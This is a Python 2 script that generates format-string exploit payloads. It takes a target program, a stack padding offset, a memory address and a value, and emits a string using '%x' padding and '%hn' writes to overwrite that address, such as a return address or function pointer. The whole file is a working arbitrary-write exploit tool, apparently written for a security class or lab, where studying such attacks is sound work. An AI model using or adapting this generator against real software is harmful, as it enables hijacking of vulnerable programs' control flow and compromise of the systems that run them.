#!/usr/bin/python

"""
AUTHOR: TAISHI NOJIMA

This program is to exploit the format string vulnerability and change the value of a given memory address to a given value
[USAGE] python ./fmt_exploit.py <(str)PROGRAM> <(int)PAD> <(hex int)MEM ADDR> <(hex int)VALUE>
Assume: pad == 11, mem_addr == 0804a02c, value == bffffd72
"""

import sys

if len(sys.argv) != 5:
    print "[USAGE] python ./fmt_exploit.py <(str)PROGRAM> <(int)PAD> <(hex int)MEM ADDR> <(hex int)VALUE>"
    exit()

program = sys.argv[1]
pad = int(sys.argv[2])
format_string = ""

mem_addr = [(i+j) for (i, j) in zip(sys.argv[3][::2],sys.argv[3][1::2])]
mem_addr = mem_addr[::-1]         #reverse   :['2c','a0','04','08']
least_sig_byte = mem_addr[0]       #least significant byte: '2c'
mem_addr.remove(least_sig_byte)    

format_string += chr(int(least_sig_byte,16))
for i in mem_addr:
    format_string += chr(int(i, 16))
format_string += chr(int(least_sig_byte,16)+ 2)       #add 2 to the least sig: '2e'
for i in mem_addr:
    format_string += chr(int(i, 16))

value = [(i+j+k+l) for (i, j,k,l) in zip(sys.argv[4][::4],sys.argv[4][1::4],sys.argv[4][2::4],sys.argv[4][3::4])]
value = value[::-1] #reverse :['fd72','bfff']

temp = str(int(value[0],16) - 8)    # 0xfd72-8
format_string += "%"+temp+"x"       # %64874x
format_string += "%"+str(pad)+"$hn"# %4\$hn


if (int(value[1],16) - int(value[0],16)) < 8:   # 0xbfff - 0xfd72 = -15731
    temp = "1"+value[1]                         # 0x1bfff
else:
    temp = value[1]

temp = str(int(temp,16) - int(value[0],16)) # 0x1bfff - 0xfd72 = 49805
format_string += "%"+temp+"x"       # %49805x
format_string += "%"+str(pad+1)+"$hn"
print format_string


